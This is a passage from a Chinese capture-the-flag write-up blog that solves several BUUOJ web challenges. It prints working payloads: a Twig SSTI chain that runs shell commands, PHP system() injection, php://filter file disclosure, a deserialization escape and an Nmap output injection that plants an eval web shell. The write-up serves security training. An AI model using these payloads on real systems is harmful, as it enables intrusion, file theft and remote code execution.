<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, Your path would be more exciting if it ended in !</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, Your URL did not ask to </code>get<code>the</code>flag<code> in its query string.</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I was looking for a parameter named &amp;=&amp;=&amp;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
<p>得到</p>
<p><code>I&#39;m sorry, I expected &#39;&amp;=&amp;=&amp;&#39; to equal &#39;%00 #这有个换行符的 &#39;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, Basically, I was expecting the username player.</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:player&#39; # 暂时不知道密码，随便输一个</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, Basically, I was expecting the password of the hex representation of the md5 of the string &#39;open sesame&#39;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I was expecting you to be using a 1337 Browser.</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I was expecting your browser version (v.XXXX) to be over 9000!</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I was eXpecting this to be Forwarded-For someone!</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 127.0.0.1&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I was eXpecting this to be Forwarded For someone through another proxy!</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 1.1.1.1,127.0.0.1&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I was expecting the forwarding client to be 13.37.13.37</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I was expecting a Fortune Cookie</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;Fuxku&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I was expecting the cookie to contain the number of the HTTP Cookie (State Management Mechanism) RFC from 2011.</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 这里需要cookie包含2021年的RFC编号，可以到这查https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;draft-ietf-httpstate-cookie&#x2F;23&#x2F;</span><br><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I expect you to accept only plain text media (MIME) type.</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, Я ожидал, что вы говорите по-русски.</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I was expecting to share resources with the origin https://ctf.bsidessf.net</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39; -H &#39;origin: https:&#x2F;&#x2F;ctf.bsidessf.net&#39;</span><br></pre></td></tr></table></figure>
<p>得到<code>I&#39;m sorry, I was expecting you would be refered by https://ctf.bsidessf.net/challenges?</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39; -H &#39;origin: https:&#x2F;&#x2F;ctf.bsidessf.net&#39; -e &#39;https:&#x2F;&#x2F;ctf.bsidessf.net&#x2F;challenges&#39;</span><br></pre></td></tr></table></figure>
<p>最终得到flag</p>
<blockquote>
<p>flag{a3dda583-ca36-4b88-935f-cb4bbbeef896}</p>
</blockquote>
<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h3 id="SSTI-Twig"><a href="#SSTI-Twig" class="headerlink" title="SSTI(Twig"></a>SSTI(Twig</h3><p>Twig的模板注入，判断如下：</p>
49 回显7777777 => Jinja2 ，回显49 => Twig

<p>payload</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>拿到flag</p>
<blockquote>
<p>flag{c485b15c-f3df-4dc8-abb3-ed322ea30c66}</p>
</blockquote>
<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><h3 id="php函数拼接"><a href="#php函数拼接" class="headerlink" title="php函数拼接"></a>php函数拼接</h3><p>构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;pi&#125;(<span class="variable">$$pi</span>&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure>
<p>base_convert(37907361743,10,36)构造函数名hex2bin，hex2bin可以将十六进制转换为ASCII字符</p>
<p>先使用dechex函数将<code>1598506324</code>转换为十六进制，然后再使用hex2bin将十六进制转换成ASCII字符即可得到_GET</p>
<h3 id="php特性利用"><a href="#php特性利用" class="headerlink" title="php特性利用"></a>php特性利用</h3><p>php中可以使用{}代替[]，然后再拼接一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$$pi</span>&#123;pi&#125; =&gt; <span class="variable">$_GET</span>&#123;pi&#125;</span><br><span class="line">(<span class="variable">$$pi</span>&#123;abs&#125;) =&gt; (<span class="variable">$_GET</span>&#123;abs&#125;)</span><br></pre></td></tr></table></figure>
<p>最后传入<code>pi=system，abs=cat /flag</code>即可得到flag</p>
<blockquote>
<p>flag{693ee03e-518a-46bb-9102-79ac9f502b31}</p>
</blockquote>
<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><h3 id="php伪协议嵌套"><a href="#php伪协议嵌套" class="headerlink" title="php伪协议嵌套"></a>php伪协议嵌套</h3><p>利用php伪协议可以读取到index的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?category=php:<span class="comment">//filter/convert.base64-encode/resource=index</span></span><br></pre></td></tr></table></figure>
<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos(<span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span>) !== <span class="literal">false</span> || strpos(<span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span>) !== <span class="literal">false</span> || strpos(<span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现需要包括<code>woofers</code>、<code>meowers</code>、<code>index</code>才会运行文件包含</p>
<p>查了查之后知道了php的<code>php://filter</code>伪协议可以嵌套一层协议</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?category=php:<span class="comment">//filter/convert.base64-encode/index/resource=flag</span></span><br></pre></td></tr></table></figure>
<p>即可得到flag</p>
<blockquote>
<p>flag{ff24c3cf-9d00-4527-acab-ee177724d0a1}</p>
</blockquote>
<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><h3 id="phpinfo信息获取"><a href="#phpinfo信息获取" class="headerlink" title="phpinfo信息获取"></a>phpinfo信息获取</h3><p>看到题目中有个<code>eval(&#39;phpinfo();&#39;);</code></p>
<p>打开后在phpinfo里发现了一个<code>d0g3_f1ag.php</code></p>
<h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>题目所给的源代码中有extract函数，可形成变量覆盖漏洞，<a href="https://blog.csdn.net/weixin_34486302/article/details/115153306?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161857274516780357224643%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161857274516780357224643&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-115153306.first_rank_v2_pc_rank_v29&utm_term=extract%E5%AF%BC%E8%87%B4%E7%9A%84%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96&spm=1018.2226.3001.4187">具体看这</a></p>
<p>于是可以重新传入SESSION参数进行覆盖</p>
<h3 id="反序列化对象逃逸"><a href="#反序列化对象逃逸" class="headerlink" title="反序列化对象逃逸"></a>反序列化对象逃逸</h3><p>由题目可知，想要得到flag，必须得构造一个img=d0g3_f1ag.php，但是如果直接传入d0g3_f1ag.php则会被正则替换掉</p>
<p>于是可以使用反序列化的对象逃逸性质</p>
<p>正常序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>] = <span class="string">&#x27;ababab&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>] = base64_encode(<span class="string">&#x27;d0g3_f1ag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>
<p>可以得到</p>
<blockquote>
<p>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:6:”ababab”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p>
</blockquote>
<p>于是我们可以这样POST</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>会得到这个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>解释一下.jpg</code></p>
<p>按照上面POST的序列化，可以得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>而flag被过滤了，于是会得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>由于user的参数为24，而原来的6个flag变为””了，所以会往后继续读取参数</p>
<p>所以[]的参数就被读取为user的参数了，而原来的function则被替换掉了，再加上最后的}闭合，后面的img也被替换掉了，就造成了反序列化的对象逃逸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;[&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a]&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>最后则通过提示flag在<code>/d0g3_fllllllag</code>中，重新放个base64进去得到flag</p>
<blockquote>
<p>flag{f7eb2141-7201-43fe-b97d-cc5defacd03d}</p>
</blockquote>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><h3 id="urlsplit函数处理问题"><a href="#urlsplit函数处理问题" class="headerlink" title="urlsplit函数处理问题"></a>urlsplit函数处理问题</h3><p>题目首先调用了urlsplit函数，讲url分割后判断是否为<code>suctf.cc</code></p>
<p>然后后面有调用了unurlsplit函数将url合起来，再次判断是否为<code>suctf.cc</code></p>
<p>测试函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;file:////suctf.cc/abababab&quot;</span></span><br><span class="line">parts = parse.urlsplit(url)</span><br><span class="line">print(parts)</span><br><span class="line"></span><br><span class="line">url2 = urlunsplit(parts)</span><br><span class="line">parts2 = parse.urlsplit(url2)</span><br><span class="line">print(parts2)</span><br></pre></td></tr></table></figure>
<p>则可以得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SplitResult(scheme=<span class="string">&#x27;file&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;//suctf.cc/abababab&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">SplitResult(scheme=<span class="string">&#x27;file&#x27;</span>, netloc=<span class="string">&#x27;suctf.cc&#x27;</span>, path=<span class="string">&#x27;/abababab&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这就可以成功绕过前面分割后的判断语句</p>
<h3 id="nginx的配置"><a href="#nginx的配置" class="headerlink" title="nginx的配置"></a>nginx的配置</h3><blockquote>
<p>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>
</blockquote>
<p>这就可以构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>
<p>得到一个flag路径<code>/usr/fffffflag</code></p>
<p>获取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>
<blockquote>
<p>flag{23da88ac-576f-4e40-819a-06e1c7da43fb}</p>
</blockquote>
<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>进入robots.txt发现一个/fAke_f1agggg.php，进去后在http协议头上发现了一个fl4g.php</p>
<p>进入后是一串代码审计</p>
<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>首先第一串是intval函数绕过，优化一下代码，我们是要使之echo 1才能绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<blockquote>
<p>?num=1e5</p>
</blockquote>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>然后是md5绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们得遍历出来一个md5前是0e开头并且md5后还是0e开头的字符串</p>
<p>构造payload</p>
<blockquote>
<p>?num=1e5&amp;md5=0e215962017</p>
</blockquote>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>最后就是命令注入的简单过滤了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line"><span class="comment">//        system($get_flag);</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了空格还过滤了cat，但是也简单</p>
<p>构造payload</p>
<blockquote>
<p>?num=0x23333&amp;md5=0e215962017&amp;get_flag=base64%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag </p>
</blockquote>
<p>最后得到flag</p>
<blockquote>
<p>flag{9093578f-7506-4128-b9d0-e2c08aab5bcd}</p>
</blockquote>
<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><h3 id="Nmap的命令使用"><a href="#Nmap的命令使用" class="headerlink" title="Nmap的命令使用"></a>Nmap的命令使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出</span><br><span class="line">-oN       标准输出</span><br><span class="line">-oX       XMl输出</span><br><span class="line">-oS       script jlddi3</span><br><span class="line">-oG       grepable</span><br><span class="line">-oA       同时输出三种主要格式</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<blockquote>
<p>127.0.0.1 ‘ -oN b.phtml &lt;?=eval($_POST[a]);?&gt;’</p>
</blockquote>
<p>可以传一个马上去，然后post命令注入</p>
<p>最后得到flag</p>
<blockquote>
<p>flag{5ba50035-1b24-49c0-86a1-57d28288c511}</p>
</blockquote>
<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>明示阴间题？</p>
<p><img src="https://i.loli.net/2021/04/24/r7DcNFXlEPRIyas.png"></p>
<p>查看源代码发现一个/time.php?source</p>
